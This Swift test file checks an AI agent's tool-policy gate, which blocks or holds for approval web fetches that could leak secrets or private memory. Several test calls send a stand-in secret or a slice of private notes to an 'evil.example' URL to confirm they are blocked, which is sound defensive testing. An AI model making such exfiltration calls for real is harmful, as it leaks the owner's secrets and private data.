import ClawCore
import Foundation
import Testing

@testable import ClawTools

/// Gate-test stand-ins declaring each egress class. `FetchLikeTool` resolves its target the way
/// web_fetch does (CanonicalURL + owner-facing refusal copy), so gate tests exercise the real
/// resolution contract without HTTP plumbing.
struct FetchLikeTool: Tool {
  var name = "web_fetch"

  var definition: ToolDefinition {
    ToolDefinition(
      name: name,
      description: "stub",
      parameters: .object(["type": .string("object")]),
      egressClass: .arbitraryDestination
    )
  }

  let timeout: Duration = .seconds(1)

  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? {
    guard let rawURL = arguments.objectValue?["url"]?.stringValue, rawURL.isEmpty == false else {
      return .refused(reason: "\(name) needs a non-empty \"url\" argument.")
    }
    switch CanonicalURL.canonicalize(rawURL) {
    case .success(let canonical):
      return .resolved(canonical)
    case .failure:
      return .refused(reason: "That is not a valid URL.")
    }
  }

  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
    ToolPayload(content: "fetched", status: .ok, ingestedUntrusted: true)
  }
}

struct SearchLikeTool: Tool {
  let definition = ToolDefinition(
    name: "web_search",
    description: "stub",
    parameters: .object(["type": .string("object")]),
    egressClass: .fixedEndpoint
  )
  let timeout: Duration = .seconds(1)

  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }

  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
    ToolPayload(content: "results", status: .ok, ingestedUntrusted: true)
  }
}

@Suite struct ToolPolicyGateTests {
  private static let memoryText = "The owner's private project is called Operation Nightjar Falcon."

  private func makeGate(
    privateFiles: [String] = [ToolPolicyGateTests.memoryText]
  ) -> ToolPolicyGate {
    ToolPolicyGate(
      argGuard: ExfilArgGuard(secretValues: ["s3cret-value-1"]),
      privateFileLoader: { privateFiles }
    )
  }

  private func makeContext(
    tainted: Bool = false,
    runIngested: Bool = false,
    assemblyPrivate: Bool = false,
    runPrivate: Bool = false,
    grant: OneTurnGrant? = nil,
    approvalPending: Bool = false,
    nonInteractive: Bool = false
  ) -> ToolDispatchContext {
    ToolDispatchContext(
      sessionTainted: tainted,
      runIngestedUntrusted: runIngested,
      assemblyPrivateData: assemblyPrivate,
      runPrivateData: runPrivate,
      grant: grant,
      approvalAlreadyPending: approvalPending,
      nonInteractive: nonInteractive
    )
  }

  private func fetchCall(_ url: String) -> ToolCall {
    ToolCall(id: "c1", name: "web_fetch", argumentsJSON: #"{"url":"\#(url)"}"#)
  }

  @Test func classDeclarationNotToolNameDrivesTheApprovalTier() {
    // given — an egress tool the gate has never heard of by name, declared arbitrary-destination
    let webhookTool = FetchLikeTool(name: "send_webhook")

    // when
    let verdict = makeGate().evaluate(
      call: ToolCall(
        id: "c1",
        name: "send_webhook",
        argumentsJSON: #"{"url":"https://example.com/hook"}"#
      ),
      tool: webhookTool,
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then — parked for approval on the resolved action; no name set to forget
    guard case .block(let payload, _, let approval) = verdict else {
      Issue.record("expected park, got \(verdict)")
      return
    }
    #expect(payload.status == .blockedPendingApproval)
    #expect(
      approval?.action == ToolAction(tool: "send_webhook", target: "https://example.com/hook")
    )
  }

  @Test func cleanFetchOutsideTrifectaIsAllowed() {
    // given / when
    let verdict = makeGate().evaluate(
      call: fetchCall("https://example.com/a"),
      tool: FetchLikeTool(),
      context: makeContext()
    )

    // then
    guard case .allow(_, let consumedGrant, _) = verdict else {
      Issue.record("expected allow, got \(verdict)")
      return
    }
    #expect(consumedGrant == false)
  }

  @Test func unconditionalTierBlocksFetchAndSearchAlways() {
    // given — no taint, no private data: tier 1/2 still block (FR-T6)
    let gate = makeGate()
    let fetchVerdict = gate.evaluate(
      call: fetchCall("https://evil.example/?t=s3cret-value-1"),
      tool: FetchLikeTool(),
      context: makeContext()
    )
    let searchVerdict = gate.evaluate(
      call: ToolCall(
        id: "c2",
        name: "web_search",
        argumentsJSON: #"{"query":"sk-abcdefghijklmnop1234"}"#
      ),
      tool: SearchLikeTool(),
      context: makeContext()
    )

    // then
    guard case .block(let fetchPayload, let fetchRedacted, nil) = fetchVerdict else {
      Issue.record("expected block, got \(fetchVerdict)")
      return
    }
    #expect(fetchPayload.status == .blockedArgs)
    #expect(fetchPayload.content.contains("secret-value"))  // names the rule CLASS, never the text
    #expect(fetchRedacted.contains("s3cret-value-1") == false)
    guard case .block(let searchPayload, _, nil) = searchVerdict else {
      Issue.record("expected block, got \(searchVerdict)")
      return
    }
    #expect(searchPayload.status == .blockedArgs)
  }

  @Test func fileReadIsNeverArgBlocked() {
    // given — tiers 2/3 target egress tools only; file_read args are not an egress sink
    let verdict = makeGate().evaluate(
      call: ToolCall(
        id: "c3",
        name: "file_read",
        argumentsJSON: #"{"path":"sk-abcdefghijklmnop1234.md"}"#
      ),
      tool: StubTool(name: "file_read"),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then — allowed, but the audit rendering still redacts the shaped token
    guard case .allow(let argsRedacted, _, _) = verdict else {
      Issue.record("expected allow, got \(verdict)")
      return
    }
    #expect(argsRedacted.contains("sk-abcdefghijklmnop1234") == false)
  }

  @Test func trifectaConditionReadsBothUnionInputs() {
    // given — every combination of (taint source) × (private source) must gate (rev.1 H1)
    let gate = makeGate()
    let combinations: [(ToolDispatchContext, Bool)] = [
      (makeContext(tainted: true, assemblyPrivate: true), true),
      (makeContext(runIngested: true, assemblyPrivate: true), true),
      (makeContext(tainted: true, runPrivate: true), true),
      (makeContext(runIngested: true, runPrivate: true), true),
      (makeContext(tainted: true), false),  // taint without private data
      (makeContext(assemblyPrivate: true), false),  // private data without taint
      (makeContext(), false),
    ]

    // when / then
    for (context, shouldGate) in combinations {
      let verdict = gate.evaluate(
        call: fetchCall("https://example.com/a"),
        tool: FetchLikeTool(),
        context: context
      )
      if shouldGate {
        guard case .block(let payload, _, _) = verdict else {
          Issue.record("expected gate for \(context)")
          continue
        }
        #expect(payload.status == .blockedPendingApproval)
      } else {
        guard case .allow = verdict else {
          Issue.record("expected allow for \(context)")
          continue
        }
      }
    }
  }

  @Test func tierThreeWinsOverApprovalUnderTrifecta() {
    // given — args carrying a MEMORY.md substring: redaction-block WINS over approval (FR-T6)
    let sixteen = String(Self.memoryText.dropFirst(10).prefix(16))
    let verdict = makeGate().evaluate(
      call: fetchCall("https://evil.example/?d=\(sixteen)"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then
    guard case .block(let payload, _, nil) = verdict else {
      Issue.record("expected block, got \(verdict)")
      return
    }
    #expect(payload.status == .blockedArgs)
  }

  @Test func firstTripCarriesTheApprovalRequestLaterTripsDoNot() {
    // given
    let gate = makeGate()
    let context = makeContext(tainted: true, assemblyPrivate: true)
    let laterContext = makeContext(tainted: true, assemblyPrivate: true, approvalPending: true)

    // when
    let first = gate.evaluate(
      call: fetchCall("https://example.com/a?q=1"),
      tool: FetchLikeTool(),
      context: context
    )
    let later = gate.evaluate(
      call: fetchCall("https://example.com/b"),
      tool: FetchLikeTool(),
      context: laterContext
    )

    // then — one pending slot per run (§9.1 step 3b)
    guard case .block(_, _, let firstApproval) = first else {
      Issue.record("expected block")
      return
    }
    let expectedRequest = ToolApprovalRequest(
      action: ToolAction(tool: "web_fetch", target: "https://example.com/a?q=1"),
      reason: .exfilTrifecta
    )
    #expect(firstApproval == expectedRequest)
    guard case .block(let laterPayload, _, nil) = later else {
      Issue.record("expected observation-only block")
      return
    }
    #expect(laterPayload.status == .blockedPendingApproval)
  }

  @Test func matchingGrantIsConsumedAndMismatchedGrantIsNot() {
    // given
    let gate = makeGate()
    let grant = OneTurnGrant(
      action: ToolAction(tool: "web_fetch", target: "https://example.com/a?q=1")
    )

    // when — exact canonical match executes; any query-byte difference re-trips
    let matching = gate.evaluate(
      call: fetchCall("https://Example.com/a?q=1"),  // canonicalizes to the grant key
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true, grant: grant)
    )
    let differing = gate.evaluate(
      call: fetchCall("https://example.com/a?q=2"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true, grant: grant)
    )

    // then
    guard case .allow(_, let consumedGrant, _) = matching else {
      Issue.record("expected allow via grant, got \(matching)")
      return
    }
    #expect(consumedGrant)
    guard case .block(let payload, _, _) = differing else {
      Issue.record("expected re-trip, got \(differing)")
      return
    }
    #expect(payload.status == .blockedPendingApproval)
  }

  @Test func grantForAnotherToolDoesNotAuthorizeTheFetch() {
    // given — same canonical target, but the approved action belongs to a DIFFERENT tool
    let grant = OneTurnGrant(
      action: ToolAction(tool: "file_read", target: "https://example.com/a?q=1")
    )

    // when
    let verdict = makeGate().evaluate(
      call: fetchCall("https://example.com/a?q=1"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true, grant: grant)
    )

    // then — a grant is bound to the WHOLE action (tool + target); the fetch re-trips
    guard case .block(let payload, _, _) = verdict else {
      Issue.record("expected re-trip, got \(verdict)")
      return
    }
    #expect(payload.status == .blockedPendingApproval)
  }

  @Test func urlPolicyRefusalUnderTrifectaIsAnErrorBeforeAnyPrompt() {
    // given — userinfo/IDN refused at gate time, BEFORE an approval is requested (§9.2)
    let verdict = makeGate().evaluate(
      call: fetchCall("https://user:pw@example.com/"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then — the gate now blocks on the tool's own resolution copy, on every path
    guard case .block(let payload, _, nil) = verdict else {
      Issue.record("expected block, got \(verdict)")
      return
    }
    #expect(payload.status == .error)
    #expect(payload.content == "That is not a valid URL.")
  }

  @Test func missingUrlUnderTrifectaRefusesWithTheResolutionCopy() {
    // given — a fetch with no "url" argument resolves to a refusal at the gate (delta: unified copy)
    let verdict = makeGate().evaluate(
      call: ToolCall(id: "c1", name: "web_fetch", argumentsJSON: "{}"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then
    guard case .block(let payload, _, nil) = verdict else {
      Issue.record("expected block, got \(verdict)")
      return
    }
    #expect(payload.status == .error)
    #expect(payload.content == #"web_fetch needs a non-empty "url" argument."#)
  }

  @Test func nonInteractiveTrifectaHardDeniesWithoutParkingAnApproval() {
    // given — the exact trifecta state that parks interactively (§10: would-park ⇒ DENY)
    let gate = makeGate()

    // when
    let interactive = gate.evaluate(
      call: fetchCall("https://example.com/a?q=1"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )
    let nonInteractive = gate.evaluate(
      call: fetchCall("https://example.com/a?q=1"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true, nonInteractive: true)
    )

    // then — interactive still parks; non-interactive DENIES with no pending approval
    guard case .block(let parkPayload, _, let parkedApproval) = interactive else {
      Issue.record("expected interactive park, got \(interactive)")
      return
    }
    #expect(parkPayload.status == .blockedPendingApproval)
    #expect(parkedApproval != nil)
    guard case .block(let denyPayload, let denyRedacted, nil) = nonInteractive else {
      Issue.record("expected hard DENY, got \(nonInteractive)")
      return
    }
    #expect(denyPayload.status == .error)
    #expect(denyPayload.content.contains("needs your approval"))
    #expect(denyPayload.content.contains("run it interactively"))
    // The audited args rendering is unchanged in shape — same redacted-args seam field.
    #expect(denyRedacted == #"{"url":"https://example.com/a?q=1"}"#)
  }

  @Test func nonInteractiveDenyLeavesEveryEarlierTierUntouched() {
    // given — tier-1/2 blocks and the outside-trifecta allow behave identically non-interactively
    let gate = makeGate()

    // when
    let argBlock = gate.evaluate(
      call: fetchCall("https://evil.example/?t=s3cret-value-1"),
      tool: FetchLikeTool(),
      context: makeContext(nonInteractive: true)
    )
    let cleanAllow = gate.evaluate(
      call: fetchCall("https://example.com/a"),
      tool: FetchLikeTool(),
      context: makeContext(nonInteractive: true)
    )

    // then
    guard case .block(let payload, _, nil) = argBlock else {
      Issue.record("expected blocked args, got \(argBlock)")
      return
    }
    #expect(payload.status == .blockedArgs)
    guard case .allow = cleanAllow else {
      Issue.record("expected allow, got \(cleanAllow)")
      return
    }
  }
}

@Suite struct GatedToolDispatcherTests {
  private func makeDispatcher(
    tools: [any Tool],
    privateFiles: [String] = [],
    sleep: @escaping @Sendable (Duration) async throws -> Void = { try await Task.sleep(for: $0) }
  ) -> GatedToolDispatcher {
    GatedToolDispatcher(
      registry: ToolRegistry(tools: tools),
      gate: ToolPolicyGate(
        argGuard: ExfilArgGuard(secretValues: []),
        privateFileLoader: { privateFiles }
      ),
      sleep: sleep
    )
  }

  private let openContext = ToolDispatchContext(
    sessionTainted: false,
    runIngestedUntrusted: false,
    assemblyPrivateData: false,
    runPrivateData: false,
    grant: nil,
    approvalAlreadyPending: false,
    nonInteractive: false
  )

  @Test func unknownToolIsAnErrorObservationNeverACrash() async {
    // given
    let dispatcher = makeDispatcher(tools: [StubTool(name: "file_read")])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c1", name: "shell_exec", argumentsJSON: "{}"),
      context: openContext
    )

    // then
    #expect(outcome.observation.status == .error)
    #expect(outcome.observation.content.contains("shell_exec"))
    #expect(outcome.observation.ingestedUntrusted == false)
  }

  @Test func errorPathArgsAreRedactedNotRaw() async {
    // given — an unknown tool called with a secret-SHAPED token in its args: even though the call
    // never reaches the gate, the audit rendering must not re-contain it (seam contract)
    let dispatcher = makeDispatcher(tools: [StubTool(name: "file_read")])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(
        id: "c1",
        name: "shell_exec",
        argumentsJSON: #"{"cmd":"sk-abcdefghijklmnop1234"}"#
      ),
      context: openContext
    )

    // then — error observation, and the shaped token is redacted out of the audit args
    #expect(outcome.observation.status == .error)
    #expect(outcome.argsRedacted.contains("sk-abcdefghijklmnop1234") == false)
  }

  @Test func malformedArgumentsAreAnErrorObservation() async {
    // given
    let dispatcher = makeDispatcher(tools: [StubTool(name: "file_read")])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c1", name: "file_read", argumentsJSON: "{broken"),
      context: openContext
    )

    // then
    #expect(outcome.observation.status == .error)
  }

  @Test func allowedCallExecutesAndStampsIdentity() async {
    // given
    let dispatcher = makeDispatcher(tools: [
      StubTool(
        name: "file_read",
        payload: ToolPayload(content: "file text", status: .ok, ingestedUntrusted: true)
      )
    ])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c7", name: "file_read", argumentsJSON: #"{"path":"a.md"}"#),
      context: openContext
    )

    // then
    #expect(outcome.observation.callId == "c7")
    #expect(outcome.observation.toolName == "file_read")
    #expect(outcome.observation.content == "file text")
    #expect(outcome.observation.ingestedUntrusted)
  }

  @Test func executeReceivesTheGateResolvedCanonicalTarget() async {
    // given — a recording arbitrary-destination tool
    actor TargetRecorder {
      private(set) var received: String?
      func record(_ target: String?) { received = target }
    }
    struct RecordingFetchTool: Tool {
      let recorder: TargetRecorder
      let definition = ToolDefinition(
        name: "web_fetch",
        description: "stub",
        parameters: .object(["type": .string("object")]),
        egressClass: .arbitraryDestination
      )
      let timeout: Duration = .seconds(1)

      func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? {
        guard let rawURL = arguments.objectValue?["url"]?.stringValue else {
          return .refused(reason: "web_fetch needs a non-empty \"url\" argument.")
        }
        switch CanonicalURL.canonicalize(rawURL) {
        case .success(let canonical): return .resolved(canonical)
        case .failure: return .refused(reason: "That is not a valid URL.")
        }
      }

      func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
        await recorder.record(canonicalTarget)
        return ToolPayload(content: "ok", status: .ok, ingestedUntrusted: true)
      }
    }
    let recorder = TargetRecorder()
    let dispatcher = makeDispatcher(tools: [RecordingFetchTool(recorder: recorder)])

    // when
    _ = await dispatcher.dispatch(
      call: ToolCall(
        id: "c1",
        name: "web_fetch",
        argumentsJSON: #"{"url":"https://example.com/a"}"#
      ),
      context: openContext
    )

    // then — the tool acted on the gate-resolved form, not a re-derived one
    #expect(await recorder.received == "https://example.com/a")
  }

  @Test func slowToolTimesOutWithAnErrorObservation() async {
    // given — a tool that sleeps past its own tiny timeout
    struct SlowTool: Tool {
      let definition = ToolDefinition(
        name: "slow",
        description: "slow",
        parameters: .object(["type": .string("object")]),
        egressClass: .none
      )
      let timeout: Duration = .milliseconds(20)

      func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }

      func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
        try? await Task.sleep(for: .seconds(10))
        return ToolPayload(content: "late", status: .ok, ingestedUntrusted: true)
      }
    }
    let dispatcher = makeDispatcher(tools: [SlowTool()])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c1", name: "slow", argumentsJSON: "{}"),
      context: openContext
    )

    // then — the timeout is an observation, and the late success never leaks
    #expect(outcome.observation.status == .error)
    #expect(outcome.observation.content.contains("timed out"))
    #expect(outcome.observation.ingestedUntrusted == false)
  }

  @Test(.timeLimit(.minutes(1)))
  func wedgedToolIsAbandonedAtTimeoutNotAwaited() async {
    // given — a tool that never returns and ignores cancellation; the injected sleep makes the
    // timeout arm fire immediately, so no wall clock is involved on the green path
    let release = WedgeRelease()
    let dispatcher = makeDispatcher(tools: [WedgedTool(release: release)], sleep: { _ in })

    // when — under group-await semantics this call would NEVER return (the group awaits the
    // wedged child); the time limit converts that hang into a failure
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c1", name: "wedged", argumentsJSON: "{}"),
      context: openContext
    )

    // then — the timeout observation returns while the tool is still wedged
    #expect(outcome.observation.status == .error)
    #expect(outcome.observation.content.contains("timed out"))

    // release the abandoned task so it finishes before the suite exits
    await release.release()
  }
}

/// Blocks until released and IGNORES task cancellation — models a blocking syscall
/// (`getaddrinfo`) or hung I/O that cooperative cancellation cannot interrupt.
actor WedgeRelease {
  private var waiters: [CheckedContinuation<Void, Never>] = []
  private var released = false

  func wait() async {
    if released { return }
    await withCheckedContinuation { waiters.append($0) }
  }

  func release() {
    released = true
    for waiter in waiters {
      waiter.resume()
    }
    waiters.removeAll()
  }
}

struct WedgedTool: Tool {
  let release: WedgeRelease
  let definition = ToolDefinition(
    name: "wedged",
    description: "wedged",
    parameters: .object(["type": .string("object")]),
    egressClass: .none
  )
  let timeout: Duration = .seconds(30)

  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }

  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
    await release.wait()
    return ToolPayload(content: "late", status: .ok, ingestedUntrusted: false)
  }
}
